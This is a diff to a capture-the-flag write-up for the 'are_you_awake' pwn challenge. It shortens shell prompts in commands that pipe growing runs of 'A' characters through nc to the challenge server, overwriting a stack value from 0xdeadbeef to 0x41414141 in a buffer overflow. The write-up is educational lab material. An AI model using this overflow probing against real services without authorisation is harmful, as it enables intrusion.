@@ -157,7 +157,7 @@ Are you awake? Nope, you are still sleeping! (0xdeadbeef)
 ```
 Hm, nothing happened so far. But what if we add another A to the payload?
 ```
-user@627cd80eca9e /data/wargames/fuzzy.land/pwn/are_you_awake $ python -c 'print "A"*143' | nc areyouawake.chals.fuzzy.land 5503
+$ python -c 'print "A"*143' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Nope, you are still sleeping! (0xdeadbe00)
 😴
 ```
@@ -171,19 +171,19 @@ Here we go! We just successfully modified the value from ```0xdeadbeef``` to ```
 ```
 So let's continue to add some more A's to our payload:
 ```
-user@627cd80eca9e /data/wargames/fuzzy.land/pwn/are_you_awake $ python -c 'print "A"*144' | nc areyouawake.chals.fuzzy.land 5503
+$ python -c 'print "A"*144' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Nope, you are still sleeping! (0xdead000a)
 😴
-user@627cd80eca9e /data/wargames/fuzzy.land/pwn/are_you_awake $ python -c 'print "A"*145' | nc areyouawake.chals.fuzzy.land 5503
+$ python -c 'print "A"*145' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Nope, you are still sleeping! (0xde000a41)
 😴
-user@627cd80eca9e /data/wargames/fuzzy.land/pwn/are_you_awake $ python -c 'print "A"*146' | nc areyouawake.chals.fuzzy.land 5503
+$ python -c 'print "A"*146' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Nope, you are still sleeping! (0xa4141)
 😴
-user@627cd80eca9e /data/wargames/fuzzy.land/pwn/are_you_awake $ python -c 'print "A"*147' | nc areyouawake.chals.fuzzy.land 5503
+$ python -c 'print "A"*147' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Nope, you are still sleeping! (0xa414141)
 😴
-user@627cd80eca9e /data/wargames/fuzzy.land/pwn/are_you_awake $ python -c 'print "A"*148' | nc areyouawake.chals.fuzzy.land 5503
+$ python -c 'print "A"*148' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Nope, you are still sleeping! (0x41414141)
 😴
 ```
